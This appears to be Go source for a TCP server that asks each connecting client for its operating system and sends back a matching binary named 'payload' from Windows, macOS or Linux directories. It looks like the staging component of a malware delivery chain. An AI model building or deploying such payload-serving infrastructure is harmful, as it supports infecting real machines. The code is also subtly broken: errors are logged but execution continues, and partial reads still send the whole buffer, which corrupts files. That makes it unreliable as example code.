package main

import (
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
)

var (
	HOST       = os.Args[1]
	PORT       = os.Args[2]
	TYPE       = "tcp"
	BUFFERSIZE = 1024
)

var count = 0
var logger = log.New(os.Stdout, "INFO: ", log.Ldate|log.Ltime)
var payload os.File

func handleError(err error) {
	if err != nil {
		logger.Println("Panic: ", err)
		return
	}
}

func sendPayload(conn net.Conn, path string) {
	payload, err := os.Open(path)
	handleError(err)
	fileInfo, err := payload.Stat()
	handleError(err)
	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := fillString(fileInfo.Name(), 64)
	sendBuffer := make([]byte, BUFFERSIZE)
	conn.Write([]byte(fileSize))
	conn.Write([]byte(fileName))
	for {
		_, err = payload.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		conn.Write(sendBuffer)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	bufferOsName := make([]byte, 9)
	conn.Read(bufferOsName)
	osName := strings.Trim(string(bufferOsName), ":")
	if osName == "windows" {
		sendPayload(conn, "..\\payload\\windows\\payload-amd64.exe")
	} else if osName == "darwin" {
		sendPayload(conn, "../payload/darwin/payload-amd64-darwin")
	} else if osName == "linux" {
		sendPayload(conn, "../payload/linux/payload-amd64-linux")
	}
	logger.Println("File sent in theory")
	conn.Close()
}

func fillString(retunString string, toLength int) string { // Fill string with bytes
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}

func main() {

	server, err := net.Listen(TYPE, HOST+":"+PORT)
	handleError(err)
	defer server.Close()
	logger.Println("Server is now listening")

	for {
		conn, err := server.Accept()
		handleError(err)
		go handleConnection(conn)
		count++
	}
}
